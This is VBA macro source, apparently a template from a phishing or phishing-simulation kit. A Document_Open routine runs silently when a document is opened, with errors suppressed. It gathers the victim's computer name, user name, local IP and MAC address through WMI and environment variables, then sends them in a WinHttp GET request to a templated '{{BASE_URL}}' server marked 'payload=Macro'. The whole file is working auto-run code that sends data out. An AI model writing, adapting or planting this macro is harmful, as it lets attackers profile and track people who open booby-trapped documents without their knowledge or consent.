Function GetMyLocalIP() As String

    Dim strComputer     As String
    Dim objWMIService   As Object
    Dim colItems        As Object
    Dim objItem         As Object
    Dim myIPAddress     As String

    strComputer = "."

    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

    Set colItems = objWMIService.ExecQuery("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")

    For Each objItem In colItems
        If Not IsNull(objItem.IPAddress) Then myIPAddress = Trim(objItem.IPAddress(0))
        Exit For
    Next

    GetMyLocalIP = myIPAddress

End Function

Function GetMyMACAddress() As String

    Dim strComputer     As String
    Dim objWMIService   As Object
    Dim colItems        As Object
    Dim objItem         As Object
    Dim myMACAddress    As String

    strComputer = "."

    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")

    For Each objItem In colItems
        If Not IsNull(objItem.IPAddress) Then myMACAddress = objItem.MACAddress
        Exit For
    Next

    GetMyMACAddress = myMACAddress

End Function

Private Sub Document_Open()

On Error Resume Next

Dim sHostName As String
Dim sUserName As String
Dim sIP As String
Dim sMAC As String
Dim sBaseURL As String
Dim sLink As String

sHostName = Environ$("computername")
sUserName = Environ$("username")
sIP = GetMyLocalIP()
sMAC = GetMyMACAddress()
sBaseURL = "{{BASE_URL}}"

sLink = sBaseURL & "&username=" & sUserName & "&computername=" & sHostName & "&ip=" & sIP & "&mac=" & sMAC & "&payload=Macro"

Dim MyRequest As Object

    Set MyRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
    MyRequest.Open "GET", _
    sLink

    MyRequest.Send

End Sub
